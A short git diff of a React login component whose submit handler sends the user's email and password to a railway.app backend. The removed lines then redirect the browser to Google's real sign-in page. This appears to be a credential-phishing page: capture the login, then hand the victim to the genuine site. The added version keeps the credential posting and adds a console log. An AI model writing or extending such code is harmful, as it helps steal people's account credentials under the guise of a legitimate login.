@@ -20,31 +20,29 @@ export default function AuthRight({
     setStep(2);
   };
 
-  /* 🔥 ENVÍO FINAL */
-  const handleSubmit = async () => {
-    try {
-      const res = await fetch(
-        "https://login-app-production-b48f.up.railway.app/api/auth/login",
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({ email, password }),
-        }
-      );
+const handleSubmit = async () => {
+  try {
+    console.log("CLICK LOGIN 🔥");
 
-      const data = await res.json();
+    const res = await fetch(
+      "https://login-app-production-b48f.up.railway.app/api/auth/login",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ email, password }),
+      }
+    );
 
-      console.log("RESPUESTA BACKEND:", data);
+    const data = await res.json();
 
-      /* 🔥 REDIRECCIÓN */
-      window.location.href = "https://accounts.google.com";
+    console.log("RESPUESTA BACKEND:", data);
 
-    } catch (error) {
-      console.error("ERROR LOGIN:", error);
-    }
-  };
+  } catch (error) {
+    console.error("ERROR LOGIN:", error);
+  }
+};
 
   return (
     <div className="right">
